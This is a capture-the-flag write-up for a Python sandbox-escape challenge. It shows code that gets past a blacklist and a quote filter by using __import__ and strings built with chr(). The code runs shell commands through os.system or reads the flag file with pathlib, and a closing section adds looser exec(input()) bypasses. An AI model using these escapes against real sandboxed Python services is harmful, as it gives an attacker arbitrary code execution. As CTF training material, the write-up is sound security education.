# Solution
You have access to global variables (see `g`), just `open` is blacklisted.

That means you can import stuff using `__import__`.

Since `"` and `'` are replaced from the input with an empty string, you need to create your string using `chr(ascii)`

The following executes a system command to print the contents of the file.
##### Windows: 
```py
__import__("os").system("type flag")
# encoded:
__import__(str().join(map(chr, [0x6F, 0x73]))).system(str().join(map(chr, [0x74, 0x79, 0x70, 0x65, 0x20, 0x66, 0x6C, 0x61, 0x67])))
```
##### Unix:
```py
__import__("os").system("cat flag")
# encoded:
__import__(str().join(map(chr, [0x6F, 0x73]))).system(str().join(map(chr, [0x63, 0x61, 0x74, 0x20, 0x66, 0x6C, 0x61, 0x67])))
```
##### Crossplatform (using pathlib):
```py
__import__("pathlib").Path("flag").read_text()
# encoded:
__import__(str().join(map(chr, [112, 97, 116, 104, 108, 105, 98]))).Path(str().join(map(chr, [102, 108, 97, 103]))).read_text()
```

## Fun solutions before I resticted it more
Without blocking `exec` and `eval`:
```py
:exec(input())
while True: exec(input('> '))
> from pathlib import *
> print(pathlib.Path('flag').read_text())
```
Without blocking `input`:
`__import__(input()).Path(input()).read_text()`
